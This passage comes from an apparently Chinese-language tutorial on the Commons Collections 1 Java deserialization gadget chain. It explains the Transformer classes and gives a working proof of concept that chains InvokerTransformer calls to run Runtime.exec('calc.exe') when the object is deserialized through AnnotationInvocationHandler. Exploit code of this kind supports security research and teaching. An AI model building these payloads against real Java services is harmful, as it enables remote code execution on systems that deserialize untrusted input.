</span></span></code></pre></div><ul><li><code>TransformedMap</code></li></ul><p>TransformedMap对innerMap作了修饰，传出的outerMap是修饰后的M</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Map</span> <span style=color:#111>outerMap</span> <span style=color:#f92672>=</span> <span style=color:#111>TransformedMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innerMap</span><span style=color:#f92672>,</span> <span style=color:#111>KeyTransformer</span><span style=color:#f92672>,</span> <span style=color:#111>valueTransformer</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><p>keyTransformer是处理新元素key的回调，valueTransformer是处理新元素value的回调；这里的回调并不是回调函数 而是一个实现了上面Transformer接口的类</p><ul><li><code>ConstantTransformer</code></li></ul><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#75af00>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>constantToReturn</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>super</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>	<span style=color:#111>iConstant</span> <span style=color:#f92672>=</span> <span style=color:#111>constantToReturn</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>transform</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>input</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>return</span> <span style=color:#111>iConstant</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>是一个实现了Transformer接口的类，它的过程类似构造函数时传入一个对象，在transform方法中将这个对象返回，作用是包装任意一个对象，在执行回调时返回这个对象，方便后续操作</p><ul><li><code>InvokerTransformer</code></li></ul><p>也是一个实现了Transformer接口的类，类可以用来执行任意方法，这也是反序列化能RCE的关键</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#75af00>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>methodName</span><span style=color:#f92672>,</span> <span style=color:#111>Class</span><span style=color:#f92672>[]</span> <span style=color:#111>paramTypes</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>super</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>	<span style=color:#111>iMethodName</span> <span style=color:#f92672>=</span> <span style=color:#111>methodName</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>	<span style=color:#111>iParamTypes</span> <span style=color:#f92672>=</span> <span style=color:#111>paramTypes</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>	<span style=color:#111>iArgs</span> <span style=color:#f92672>=</span> <span style=color:#111>args</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>第一个参数是待执行的方法名，第二个参数是方法的参数类型，第三个是传入的参数</p><p>之后的回调transform方法执行input对象的iMethodName方法</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>transform</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>input</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>if</span><span style=color:#f92672>(</span><span style=color:#111>input</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>return</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>try</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>		<span style=color:#111>Class</span> <span style=color:#111>cls</span> <span style=color:#f92672>=</span> <span style=color:#111>input</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>		<span style=color:#111>Method</span> <span style=color:#111>method</span> <span style=color:#f92672>=</span> <span style=color:#111>cls</span><span style=color:#f92672>.</span><span style=color:#75af00>getMethod</span><span style=color:#f92672>(</span><span style=color:#111>iMethodName</span><span style=color:#f92672>,</span> <span style=color:#111>iParamTypes</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>return</span> <span style=color:#111>method</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>input</span><span style=color:#f92672>,</span> <span style=color:#111>iArgs</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span><span style=color:#00a8c8>catch</span><span style=color:#f92672>(</span><span style=color:#111>NoSuchMethodException</span> <span style=color:#111>ex</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>FunctorException</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;InvokerTransformer: The method &#39;&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>iMethodName</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;&#39; on &#39;&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>input</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;&#39; does not exist&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span><span style=color:#00a8c8>catch</span><span style=color:#f92672>(</span><span style=color:#111>IllegalAccessException</span> <span style=color:#111>ex</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>FunctorException</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;InvokerTransformer: The method &#39;&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>iMethodName</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;&#39; on &#39;&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>input</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;&#39; cannot be accessed&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span><span style=color:#00a8c8>catch</span><span style=color:#f92672>(</span><span style=color:#111>InvocationTargetException</span> <span style=color:#111>ex</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>FunctorException</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;InvokerTransformer: The method &#39;&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>iMethodName</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;&#39; on &#39;&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>input</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;&#39; threw an exception&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>ex</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><ul><li><code>ChainedTransformer</code></li></ul><p>也是一个实现了Transformer接口的类，作用是将内部多个Transformer串在一起</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#75af00>ChainedTransformer</span><span style=color:#f92672>(</span><span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>super</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>	<span style=color:#111>iTransformers</span> <span style=color:#f92672>=</span> <span style=color:#111>transformers</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>transform</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>object</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>for</span><span style=color:#f92672>(</span><span style=color:#00a8c8>int</span> <span style=color:#111>i</span> <span style=color:#f92672>=</span> <span style=color:#111>0</span><span style=color:#f92672>;</span> <span style=color:#111>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#111>iTransformers</span><span style=color:#f92672>.</span><span style=color:#75af00>length</span><span style=color:#f92672>;</span> <span style=color:#111>i</span><span style=color:#f92672>++){</span>
</span></span><span style=display:flex><span>		<span style=color:#111>object</span> <span style=color:#f92672>=</span> <span style=color:#111>iTransformers</span><span style=color:#f92672>[</span><span style=color:#111>i</span><span style=color:#f92672>].</span><span style=color:#75af00>transform</span><span style=color:#f92672>(</span><span style=color:#111>object</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>return</span> <span style=color:#111>object</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>前一个回调返回的结果可以作为后一个回调的参数传入</p><h3 id=demo>demo</h3><p>然后再来看demo</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>testCC1</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>Runtime</span><span style=color:#f92672>.</span><span style=color:#75af00>getRuntime</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;exec&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;calc.exe&#34;</span><span style=color:#f92672>}),</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span> <span style=color:#111>transformerChain</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ChainedTransformer</span><span style=color:#f92672>(</span><span style=color:#111>transformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>innerMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>outerMap</span> <span style=color:#f92672>=</span> <span style=color:#111>TransformedMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innerMap</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#111>transformerChain</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>outerMap</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;test&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;amiz&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>我们创建了一个ChainedTransformer，包含ConstantTransformer（得到Runtime对象）和InvokerTransformer（执行代码部分），这个ChainedTransformer只是作为回调部分，我们用TransformedMap.decorate对它进行包装，最后通过<code>outerMap.put</code> 向Map中放入新元素触发回调，进而执行命令</p><h3 id=transformedmap>TransformedMap</h3><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>ysoserial.payloads</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.Transformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ChainedTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ConstantTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.InvokerTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.map.TransformedMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectInputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.annotation.Retention</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Constructor</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.InvocationHandler</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>testCC1</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>Runtime</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getMethod&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Class</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;invoke&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>Object</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]{</span><span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;exec&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>String</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;calc.exe&#34;</span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span> <span style=color:#111>transformerChain</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ChainedTransformer</span><span style=color:#f92672>(</span><span style=color:#111>transformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>innerMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>innerMap</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;value&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;xxx&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>outerMap</span> <span style=color:#f92672>=</span> <span style=color:#111>TransformedMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innerMap</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#111>transformerChain</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Class</span> <span style=color:#111>cls</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Constructor</span> <span style=color:#111>construct</span> <span style=color:#f92672>=</span> <span style=color:#111>cls</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredConstructor</span><span style=color:#f92672>(</span><span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>construct</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>InvocationHandler</span> <span style=color:#111>handler</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>InvocationHandler</span><span style=color:#f92672>)</span> <span style=color:#111>construct</span><span style=color:#f92672>.</span><span style=color:#75af00>newInstance</span><span style=color:#f92672>(</span><span style=color:#111>Retention</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>outerMap</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>barr</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectOutputStream</span> <span style=color:#111>oos</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>handler</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectInputStream</span> <span style=color:#111>ois</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectInputStream</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayInputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span> <span style=color:#111>o</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Object</span><span style=color:#f92672>)</span> <span style=color:#111>ois</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>仅有demo的代码不足以构造完全可用的poc，实际的反序列化中，不同于手工执行outerMap.put()，我们离不开一个合适的<code>readObject</code>触发<code>outerMap.put</code>-><code>transform</code></p><p>这里用到的是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，看一下它的<code>readObject</code></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>private</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>readObject</span><span style=color:#f92672>(</span><span style=color:#111>ObjectInputStream</span> <span style=color:#111>var1</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>IOException</span><span style=color:#f92672>,</span> <span style=color:#111>ClassNotFoundException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>var1</span><span style=color:#f92672>.</span><span style=color:#75af00>defaultReadObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#111>AnnotationType</span> <span style=color:#111>var2</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>var2</span> <span style=color:#f92672>=</span> <span style=color:#111>AnnotationType</span><span style=color:#f92672>.</span><span style=color:#75af00>getInstance</span><span style=color:#f92672>(</span><span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>type</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>IllegalArgumentException</span> <span style=color:#111>var9</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InvalidObjectException</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Non-annotation type in annotation serial stream&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>Map</span> <span style=color:#111>var3</span> <span style=color:#f92672>=</span> <span style=color:#111>var2</span><span style=color:#f92672>.</span><span style=color:#75af00>memberTypes</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#111>Iterator</span> <span style=color:#111>var4</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>memberValues</span><span style=color:#f92672>.</span><span style=color:#75af00>entrySet</span><span style=color:#f92672>().</span><span style=color:#75af00>iterator</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>while</span><span style=color:#f92672>(</span><span style=color:#111>var4</span><span style=color:#f92672>.</span><span style=color:#75af00>hasNext</span><span style=color:#f92672>())</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Entry</span> <span style=color:#111>var5</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Entry</span><span style=color:#f92672>)</span><span style=color:#111>var4</span><span style=color:#f92672>.</span><span style=color:#75af00>next</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>var6</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>)</span><span style=color:#111>var5</span><span style=color:#f92672>.</span><span style=color:#75af00>getKey</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Class</span> <span style=color:#111>var7</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Class</span><span style=color:#f92672>)</span><span style=color:#111>var3</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>var6</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>var7</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
